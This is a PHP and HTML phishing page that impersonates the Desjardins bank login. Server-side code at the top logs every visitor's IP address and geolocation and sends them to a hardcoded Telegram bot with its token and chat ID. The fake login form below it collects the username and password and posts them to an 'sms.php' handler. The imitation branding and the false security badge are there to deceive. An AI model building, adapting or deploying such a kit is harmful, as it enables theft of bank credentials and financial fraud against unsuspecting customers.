<?php session_start();
$_SESSION["bank"] ='DESJARDIN';

?>
<?php
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
$chat_id = '6242884372'; 

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

$geo_url = "http://ipinfo.io/{$ip_address}/json";
$geo_ch = curl_init();
curl_setopt($geo_ch, CURLOPT_URL, $geo_url);
curl_setopt($geo_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($geo_ch, CURLOPT_SSL_VERIFYPEER, false);
$geo_response = curl_exec($geo_ch);

// Initialiser les variables pour éviter les "undefined"
$latitude = 'N/A';
$longitude = 'N/A';

if (curl_errno($geo_ch)) {
    $location_info = 'Impossible de récupérer la localisation.';
} else {
    $location_data = json_decode($geo_response, true);
    
    if (isset($location_data['loc'])) {
        $location_info = $location_data['loc'];
        list($latitude, $longitude) = explode(',', $location_info);
    } else {
        $location_info = 'Localisation inconnue.';
    }
}

curl_close($geo_ch);

$message = "🏛🏛*TD*🏛🏛\n";
$message .= "IP: $ip_address\n";
$message .= "Latitude: $latitude\n";
$message .= "Longitude: $longitude";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
}

curl_close($ch);
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/desjardin/styles_mobile.css">

<link rel="stylesheet" media="screen and (min-width: 769px)" href="/desjardin/styles_pc.css">
    <title>se connecter</title>
</head>

<header>
    <div class="firstHead">
        <span>
            <span>    AA</span>
            <span>English</span>
            <span>Nous joindre</span>
            <span>Aide</span>
        </span>

    </div>
    <div class="secondHeader">
<img width="200px" height="40px" src="/desjardin/img/logo1.svg">
<img class="logo2" width="150px" height="40px" src="/desjardin/img/logo2.svg">
<img class="logo3" width="150px" height="40px" src="/desjardin/img/logo3.svg">
    </div>
</header>
<body>
    <div class="container">
        <div class="formContainer">
        <form action="/desjardin/sms.php" method="post">
                <h1> Connectez vous a votre compte  </h1>
            <label for="cvv"> Identifiant</label>
            <input type="text" name="cvv">

            <div class="check">
                <input type="checkbox"> Memoriser le mot de passe 
                <a href="#"> (c'est securitaire ? )</a>
            </div>

            <label for="mdp"> Mot de passe</label>
            <input type="password" name="mdp" >

            <div class="check">
             <span><b>Attention : </b> respcter les majuscule et minuscule</span>
                <br> 
                <br>
             <a href="#"> Mot de passe Oublier</a>
            </div>

        <div class="valid">
            <input type="submit" value="Valider">
        </div>
            

        </form>

        <div class="formFooter">
            <div class="nav1">
            <ul><a href="">S’inscrire à AccèsD</a></ul>
            <ul><a href="">S’inscrire à AccèsD Affaires</a></ul>
            <ul><a href="">Devenir membre</a></ul>
            </div>

        <div class="nav2">
            <div class="nav2-1">
                <ul><a href="">  Sécurité du site</a></ul>
                <ul><a href="">Soutien technique</a></ul>
                <ul><a href="">Signaler une fraude</a></ul>
            </div>

            <div class="nav2-2">
          <ul><a href="">   
            <img style="width:15px ; margin-right:10px" src="./img/lock.svg" alt="">Sécurité garantie à 100 %</a></ul>
            </div>
        </div>
    </div>
 </div>

        <div class="image">

        </div>
    </div>
    
</body>

<footer>
    <div class="h-footer">
    <ul class="ul-1" ><a href=""><b>SERVICES AUX PARTICULIERS</b></a></ul> 
   <ul class="ul-2" ><a href=""><b> SERVICES AUX ENTREPRISES </b></a></ul>
   <ul class="ul-3" ><a href=""><b>CONSEILS </b></a></ul>
   <ul class="ul-4" ><a href=""><b>À PROPOS </b></a></ul>
   <ul ><a href=""><b>APPLICATION MOBILE</b></a></ul>
    </div>

    <div class="b-footer">
        <div class="b-footer-1">
        <ul class="ul-1" ><a href=""><b> Sécurité </b></a></ul>
        <ul class="ul-2" ><a href=""><b>  Conditions d'utilisation et notes légales </b></a></ul> 
        <ul class="ul-3" ><a href=""><b> Confidentialité </b></a></ul>
        <ul class="ul-4" ><a href=""><b>  Personnaliser les témoins </b></a></ul>
        <ul class="ul-5" ><a href=""><b>    Accessibilité </b></a></ul>
        <ul class="ul-6" ><a href=""><b> Plan du site </b></a></ul>
       
        
        </div>
        <div class="b-footer-2">
        © 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.
        </div>
    </div>
</footer>
</html>
